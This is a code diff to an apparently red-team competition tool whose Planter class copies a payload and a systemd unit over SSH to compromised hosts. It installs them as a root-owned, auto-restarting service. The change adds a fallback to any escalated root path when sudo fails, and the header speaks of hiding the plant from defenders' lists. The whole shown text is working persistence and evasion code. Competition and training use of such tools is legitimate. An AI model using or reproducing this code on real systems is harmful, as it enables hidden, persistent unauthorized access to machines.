@@ -22,6 +22,8 @@ plant into a silent absence in both blue's and the organizer's lists.
 """
 
 import json
+import os
+import tempfile
 import time
 from pathlib import Path
 
@@ -138,16 +140,41 @@ class Planter:
             f"ExecStart={remote}\n"
             "Restart=always\nRestartSec=15\n\n"
             "[Install]\nWantedBy=multi-user.target\n")
-        # /usr/local/lib and /etc/systemd are root-owned: stage as the user, install
-        # with the box's NOPASSWD sudo.
+        # /usr/local/lib and /etc/systemd are root-owned. Install with whatever
+        # root path this foothold actually holds. The box's own NOPASSWD sudo is
+        # the common case, but a competition's misconfigurations can break it —
+        # web01's writable-sudoers chmods /etc/sudoers.d, after which sudo refuses
+        # ("/etc/sudoers.d is world writable", then "a password is required") on
+        # every cycle. The escalated foothold still reaches root there, so ride
+        # that path instead of failing the plant. The unit file travels with the
+        # payload and is moved into place, so no root wrapper has to parse a
+        # heredoc.
+        from ..effects.base import root_cmd            # lazy: avoids a cycle
+        lib_dir = f"/usr/local/lib/{names_drawn['stem']}"
+        unit_path = f"/etc/systemd/system/{unit}"
+        unit_stage = f"{stage}/{unit}"
+        local_unit = None
+        try:
+            fd, local_unit = tempfile.mkstemp(prefix="tlaloc-unit-", suffix=".service")
+            with os.fdopen(fd, "w", encoding="utf-8") as handle:
+                handle.write(unit_text)
+            self.ctx.ssh.sftp_put(ip, fh["user"], fh.get("password") or "", local_unit,
+                                  unit_stage, mode=0o644,
+                                  key_path=fh.get("key_path"))
+        except Exception as exc:                       # transport blowups are data
+            return {"ok": False, "detail": f"unit staging to {ip} failed: {exc}",
+                    "paths": [remote]}
+        finally:
+            if local_unit and os.path.exists(local_unit):
+                os.unlink(local_unit)
         script = ("set -e\n"
-                  f"sudo -n mkdir -p /usr/local/lib/{names_drawn['stem']}\n"
-                  f"sudo -n mv {stage}/{box_id} {remote}\n"
-                  f"sudo -n chmod 755 {remote}\n"
-                  f"sudo -n tee /etc/systemd/system/{unit} >/dev/null <<'EOF'\n{unit_text}EOF\n"
-                  "sudo -n systemctl daemon-reload\n"
-                  f"sudo -n systemctl enable --now {unit}\n"
-                  f"systemctl is-active {unit}\n")
+                  + root_cmd(f"mkdir -p {lib_dir}", fh) + "\n"
+                  + root_cmd(f"mv {stage}/{box_id} {remote}", fh) + "\n"
+                  + root_cmd(f"chmod 755 {remote}", fh) + "\n"
+                  + root_cmd(f"mv {unit_stage} {unit_path}", fh) + "\n"
+                  + root_cmd("systemctl daemon-reload", fh) + "\n"
+                  + root_cmd(f"systemctl enable --now {unit}", fh) + "\n"
+                  + f"systemctl is-active {unit}\n")
         rc, out, err = self.ctx.ssh.ssh(ip, fh["user"], fh.get("password") or "",
                                        script, timeout=120,
                                        key_path=fh.get("key_path"))
